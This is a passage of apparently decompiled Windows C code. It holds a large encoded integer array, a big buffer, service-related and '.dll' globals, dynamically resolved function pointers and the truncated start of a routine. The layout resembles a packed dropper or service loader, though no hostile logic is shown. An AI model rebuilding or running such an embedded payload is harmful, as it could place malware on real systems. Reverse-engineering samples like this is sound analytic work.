  1444489657,
  -1179520719,
  1404680599,
  -237985153,
  -1179010199,
  -1178994072,
  -295168071,
  -893797959,
  -1179010127,
  -1561591336,
  -1361972911,
  99638965,
  -437643178,
  1371126245,
  -437619241,
  1457213881,
  -1716391631,
  1371126201,
  -1145976183,
  2062531001,
  -262258514,
  1179013992,
  -1322206650,
  1857665467,
  -1141020505,
  -1454130759,
  -1157142407,
  2075703737,
  -1247886664,
  1362737593,
  -1208391551,
  2092874169,
  -1154697033,
  497908794,
  -1111387578,
  719305145,
  1178644584,
  -248405434,
  -241062223,
  -1840899303,
  -1179009575,
  -1297663825,
  1179010583,
  -1110339002,
  817543609,
  -1179010247,
  -1312145797,
  -1564886597,
  -1182675518,
  -262268999,
  -551993849,
  1548145208,
  1040787428,
  -1114009018,
  -1175209543,
  1052293561,
  1134677625,
  -1177896519,
  -273040999,
  -273326838,
  1846221690,
  -284508332,
  1830359422,
  1840999839,
  -1349368131,
  -1346782811,
  -1368304840,
  1101197777,
  -1221154319,
  -1179040839,
  -247356905,
  1101141913,
  -1440112143,
  1175787447,
  -1180325998,
  1396223929,
  2124918469,
  -1567513907,
  -1179010631,
  1209020758,
  -1179010627,
  832745297,
  -1704435696,
  1850099270,
  282177153,
  -1146003270,
  1085192633,
  950922464,
  2003323987,
  -1169799612,
  -1178881744,
  1177844921,
  -1180328046,
  -1456424263,
  2075769155,
  1564197182,
  1460519349,
  1056551357,
  1078242937,
  1818812437,
  -330938810,
  1381185709,
  -501424379,
  1264567061,
  -2091691681,
  1668531170,
  -1823220257,
  1895941090,
  -1554816671,
  2071970786,
  -1286379137,
  1845836868,
  1690174889,
  1396223423,
  2069687580,
  5048382,
  178176,
  1228061184,
  -541476419,
  -241062330,
  329817004,
  -1582679109,
  353729009,
  1416631110,
  1371519795,
  -1222066497,
  -1447349420,
  2025766737,
  -1142286008,
  1371126201,
  1148763817,
  323360025,
  -1119638936,
  1845325079,
  -1150478401,
  -1179010711,
  323360056,
  -1990148592,
  1890625337,
  -1095124559,
  422152496,
  1176047899,
  -1207220205,
  1404615491,
  -1855930629,
  984655673,
  700037553,
  -1297667409,
  -1179012664,
  -1174816317,
  -490952775,
  -1095124559,
  -1810263760,
  295264446,
  -1578036830,
  1363547933,
  323418609,
  -1355498920,
  398047621,
  -1318250731,
  -246331881,
  135481065,
  -1331218257,
  -1179012765,
  387388697,
  1176092013,
  950992915,
  -1312444249,
  -1441154631,
  -1566399117,
  -1179013834,
  -504278622,
  -542038614,
  -1683066582,
  -1435396694,
  -1153189669,
  -1767419079,
  -1980685906,
  1589471802,
  -1086690578,
  -1565607495,
  -1179013242,
  -965086850,
  -1179009608,
  11433711,
  1830754075,
  -1150479034,
  323402093,
  1829833128,
  -1088928071,
  2067312502,
  145630803,
  600423029,
  -1372302579,
  1052754239,
  432650869,
  -1362341069,
  -1178873448,
  -1172389959,
  1796708685,
  -1454174875,
  -1857176971,
  -95331989,
  433497920,
  -1726897519,
  -1488146872,
  -1095423530,
  1316809014,
  -1079957586,
  567257383,
  -1386247695,
  -876990785,
  -77759715,
  -1373820591,
  1019144521,
  -1319260439,
  1415398607,
  1456463295,
  1307531357,
  -1588740175,
  -1166717249,
  454509639,
  -1099613869,
  1404681543,
  1136135627,
  -1890337861,
  -1465242913,
  -1179010648,
  -1180653398,
  959756729,
  666418433,
  1483388994,
  -1195787843,
  1404943171,
  -1758873518,
  1109899513,
  -784779719,
  532199865,
  1410166894,
  1408866105,
  17411074,
  -1203470664,
  475249998,
  -1565173434,
  1178773714,
  -423452090,
  -893797969,
  -1179015745,
  -262269157,
  -248171515,
  -1390171496,
  -1178777239,
  -429360711,
  -1095124545,
  -1153579140,
  -1141247727,
  -1426984687,
  461092115,
  -1179045068,
  -1360446274,
  -1458721107,
  -1767428401,
  -1118441039,
  521875126,
  -1980677714,
  -1076810322,
  -1588740570,
  112240569,
  -1078347333,
  1103077709,
  1236840945,
  -1957577803,
  1790846703,
  -251547991,
  -249442407,
  -962549855,
  -809911877,
  1854488878,
  -1110914415,
  785365433,
  783203677,
  -1094900805,
  1856617779,
  422489789,
  -1078903378,
  -1096158927,
  61778232,
  -1388074323,
  -1118761297,
  954187690,
  -1355108626,
  5228558,
  178176,
  -1548528896,
  454539705,
  246352366,
  -1142705497,
  -1373914695,
  -1532303063,
  -1179010114,
  569321134,
  767525361,
  -1590825039,
  -1153353030,
  -1532315207,
  -1179010235,
  -1297674577,
  -1179010724,
  -1123522439,
  -1076184647,
  -1195934536,
  349028212,
  1018062417,
  -1196857286,
  2093856624,
  1959624273,
  809809235,
  173112525,
  1370574008,
  -1321158640,
  1287136849,
  -1205055053,
  844215104,
  783811756,
  -1794791368,
  -1470615880,
  94936837,
  473214091,
  -1472418440,
  900242229,
  -1589859199,
  -2093635527,
  900496412,
  -1388908117,
  -1422546884,
  -241093204,
  -1473204792,
  548970805,
  -2022332375,
  -1464519762,
  900250421,
  -1598773189,
  431602109,
  -1264012367,
  -1179010071,
  1169472265,
  -1313228357,
  -1388992381,
  -1178743960,
  -1149454151,
  -1203225416,
  347976052,
  1756698024,
  -1179009547,
  -1464128328,
  -1800892139,
  -1179010293,
  -1466477144,
  -1178926636,
  507293369,
  -1921669016,
  -1157237592,
  2060368313,
  -1095124573,
  1152318772,
  -572513108,
  -584573904,
  1395649596,
  766409554,
  -517363023,
  -1443814977,
  -1431749954,
  -351540951,
  916058401,
  -2052984527,
  -1145456199,
  -1095634655,
  -1447956175,
  -246214993,
  2038508986,
  458799545,
  1577825133,
  -1373824528,
  -295127773,
  -1665549893,
  223771884,
  1790839561,
  -1255936077,
  -861409186,
  1149600109,
  1182120243,
  185578793,
  -1285616945,
  1858144703,
  -238962602,
  -1229106759,
  -1431459318,
  1103014157,
  1169795569,
  -1186744179,
  -1482206791,
  -1567548970,
  -1370973935,
  -1432227551,
  -898976471,
  -1102690750,
  967221552,
  433498037,
  -1718508911,
  1869949663,
  -1075202775,
  -1079136742,
  28225837,
  62884337,
  1429139389,
  -1089009749,
  -1121731762,
  162458718,
  1210953241,
  -817877569,
  -1078766290,
  1450101001,
  -1374090838,
  161654131,
  2125442569,
  -1178650921,
  96057785,
  -249450987,
  -1121730679,
  -546694629,
  -1244223716,
  1018042559,
  1179024570,
  1748679097,
  890814361,
  -1368622027,
  -1721222596,
  188530549,
  -1079362881,
  -504286802,
  -1174505615,
  2014529209,
  1835012934,
  -1363579463,
  -1081478863,
  1176091955,
  1190785361,
  1363550227,
  323391985,
  832704808,
  1830396401,
  -246331719,
  1343440633,
  -1846455994,
  1180701510,
  1183445329,
  1190785361,
  817784851,
  -1184350663,
  163166649,
  1180809378,
  862602822,
  2068203088,
  1501255025,
  -1176641685,
  1064792861,
  1367044957,
  115,
  178176,
  1265839872,
  1931327803,
  1366499191,
  1398897429,
  994653043,
  1499707833,
  622311773,
  1495748979,
  1697867123,
  -1187290285,
  1366500631,
  1666409779,
  1734308637,
  1937726803,
  622311739,
  1631539571,
  863199079,
  -1184672923,
  2138398649,
  2138382265,
  1798659883,
  1561949025,
  2138263911,
  -1183747247,
  1746123193,
  -1179010631,
  599726851,
  1185895189,
  1179674514,
  -1205293498,
  -1088701654,
  -1252844237,
  1348964934,
  -552909242,
  1445469724,
  507297626,
  -1273446600,
  -1086579156,
  353610266,
  186463146,
  96878083,
  4198442,
  762560051,
  146604096,
  -402636784,
  -5474,
  269008256,
  2109603904,
  -402636755,
  -5559,
  904396906,
  1677721600,
  2037214581,
  1702389038,
  1547330816,
  1684957559,
  1551071087,
  1951627603,
  842231141,
  1816945756,
  1751343459,
  1684298853,
  2019896932,
  637468773,
  4210764,
  1079256575,
  64
}; // weak
int dword_411088 = 6044257; // weak
char aDll[] = ".dll"; // idb
int dword_4110A0 = 1; // weak
CHAR byte_411940[44] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_41196C = 0; // weak
char byte_411970[524288] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // weak
char *dword_491970; // idb
CHAR ServiceName[260]; // idb
char Destination[260]; // idb
BYTE ApplicationName; // idb
char FullPath; // idb
CHAR FileName[260]; // weak
int dword_491E88; // weak
int dword_491E8C; // weak
int dword_491E90; // weak
int dword_491E94; // weak
int dword_491E98; // weak
int (__stdcall *dword_491E9C)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_491EA0)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_491EA4)(_DWORD); // weak
int (__stdcall *dword_491EA8)(_DWORD, _DWORD); // weak
int (__stdcall *dword_491EAC)(_DWORD, _DWORD); // weak
int dword_491EB0; // weak
SERVICE_STATUS_HANDLE hServiceStatus; // idb


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3, int a4)
{
  int v4; // esi
  int v5; // ebx
  char v6; // cl
  int v7; // edi
  int v8; // esi
  int v9; // ebx
  char v10; // al
  int v11; // ebx
  unsigned __int8 v12; // cl
  int v13; // ebx
  char v14; // cl
  int v15; // ebx
  int v16; // ebx
  int v17; // ebx
  unsigned __int8 v18; // cl
  int v19; // ebx
  int v21; // [esp+Ch] [ebp-14h]
  int v22; // [esp+10h] [ebp-10h]
  signed int v23; // [esp+14h] [ebp-Ch]
  int v24; // [esp+18h] [ebp-8h]
